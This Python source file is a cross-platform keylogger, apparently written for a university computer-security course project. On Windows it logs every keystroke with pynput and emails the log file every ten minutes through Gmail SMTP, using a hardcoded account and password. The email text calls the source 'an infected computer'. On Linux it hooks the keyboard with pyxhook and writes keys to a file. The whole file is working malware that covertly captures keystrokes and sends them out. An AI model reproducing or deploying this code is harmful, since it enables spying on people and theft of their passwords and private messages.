import datetime
import logging
import os
import platform
import smtplib
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from pynput.keyboard import Key, Listener

mySystem = platform.system()
if mySystem == ('Linux'):
    import pyxhook


starttime = time.time()

# This will send the log file to the specified email account 
# at the time interval specified.
def sendEmail():
    while True:
        curDir = os.get_exec_path
        email_user = 'csci455keylog@gmail.com'
        email_password = 'Keylog Account!'
        email_send = 'csci455keylog@gmail.com'

        subject = 'Log from: ' + os.getcwd() + " at " + str(datetime.datetime.now())

        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject

        body = 'This email contains a key log file from an infected computer.'
        msg.attach(MIMEText(body,'plain'))

        #filename= os.getcwd() + 'key_log.txt'
        filename = 'key_log.txt'
        # Add log file path to open or filename
        attachment  = open('C:/Users/harsh/Desktop/RIT/Fifth Year/Computer Security/Project/key_log.txt','rb')

        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment; filename= "+filename)

        msg.attach(part)
        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email_user,email_password)


        server.sendmail(email_user,email_send,text)
        server.quit()
        time.sleep(600.0 - ((time.time() - starttime) % 60.0))

#execute windows keylogger
if mySystem == 'Windows':
    print("Windows")
    log_dir = ""
    logging.basicConfig(filename=(log_dir + "key_log.txt"),level=logging.DEBUG,
            format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        sendEmail()
        listener.join()
        

#execute linux keylogger
elif mySystem == 'Linux':
    #change this to the log file's path
    log_file = '/home/student/Desktop/file.log'
    #this function is called every time a key is pressed
    def OnKeyPress(event):
        fob = open(log_file,'a')
        fob.write(event.Key)
        fob.write('\n')
        
        #ascii value of the grave key (`)
        if event.Ascii == 96:
            fob.close()
            new_hook.cancel()
    #instanstiate HookManager class
    new_hook = pyxhook.HookManager()
    #listen to all keystrokes
    new_hook.KeyDown = OnKeyPress
    #hook the keyboard
    new_hook.HookKeyboard()
    #start the session
    new_hook.start()
else:
    print("Invalid OS")
